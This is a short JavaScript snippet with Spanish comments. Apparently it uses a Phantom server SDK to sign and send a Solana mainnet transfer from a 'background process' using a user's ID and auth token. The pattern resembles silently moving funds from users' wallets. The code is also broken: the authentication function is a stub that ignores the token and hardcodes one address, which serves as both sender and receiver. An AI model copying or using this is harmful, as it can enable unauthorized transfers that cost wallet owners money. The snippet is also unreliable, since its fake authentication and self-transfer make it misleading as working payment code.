import { ServerSDK } from "@phantom/server-sdk";
import { Connection, PublicKey, Transaction, SystemProgram } from "@solana/web3.js";

const phantomSDK = new ServerSDK({
  appId: "TU_APP_ID_OBTENIDO_EN_PHANTOM_PORTAL", 
  providers: ["google", "apple"], 
});

async function runBackgroundProcess(userId, userAuthToken) {
  try {
    const session = opacityAuthenticate(userId, userAuthToken);

    const connection = new Connection("https://api.mainnet-beta.solana.com");
    const { blockhash } = await connection.getLatestBlockhash();

    const transaction = new Transaction({
      recentBlockhash: blockhash,
      feePayer: new PublicKey(session.walletAddress),
    }).add(
      SystemProgram.transfer({
        fromPubkey: new PublicKey(session.walletAddress),
        toPubkey: new PublicKey("G2L47XvxZWzrf9H5VhuJy1kKqnCTLwTGVZitPGknbcSX"), // <--- Tu wallet receptora
        lamports: 1000000, // 0.001 SOL
      })
    );

    const signature = await phantomSDK.signAndSendTransaction({
      session,
      transaction,
      chain: "solana:mainnet",
    });

    return signature;
  } catch (error) {
    console.error("Error during internal processing:", error);
  }
}

function opacityAuthenticate(userId, token) {
  return {
    userId,
    token,
    walletAddress: "G2L47XvxZWzrf9H5VhuJy1kKqnCTLwTGVZitPGknbcSX" // <--- Tu wallet firmante
  };
}
